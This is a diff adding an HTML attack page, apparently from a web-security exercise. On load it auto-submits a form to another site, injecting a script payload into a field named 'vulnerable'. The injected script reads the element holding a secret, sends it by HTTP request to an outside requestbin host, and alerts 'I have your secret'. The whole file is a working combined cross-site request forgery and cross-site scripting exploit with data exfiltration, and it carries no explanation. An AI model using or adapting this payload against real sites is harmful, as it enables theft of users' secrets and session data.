@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+    <body>
+        <form id="myform" method="POST" action="http://bob-cloud-computing.tk:8001/unsecure">
+            <textarea style="width:100%; height: 5em" name="vulnerable">
+<script>
+    window.onload = function(e){
+        var element = document.getElementById("secret");
+        var secret = element.innerHTML;
+        var url = "http://requestbin.etnarek.com/13nfvyr1?secret=" + secret;
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", url, true);
+        xmlHttp.send();
+
+        alert("I have your secret : " + secret);
+    }
+
+</script>
+            </textarea>
+            <input type="submit" value="Submit" />
+        </form>
+        <script>
+            document.getElementById("myform").submit();
+        </script>
+    </body>
+</html>
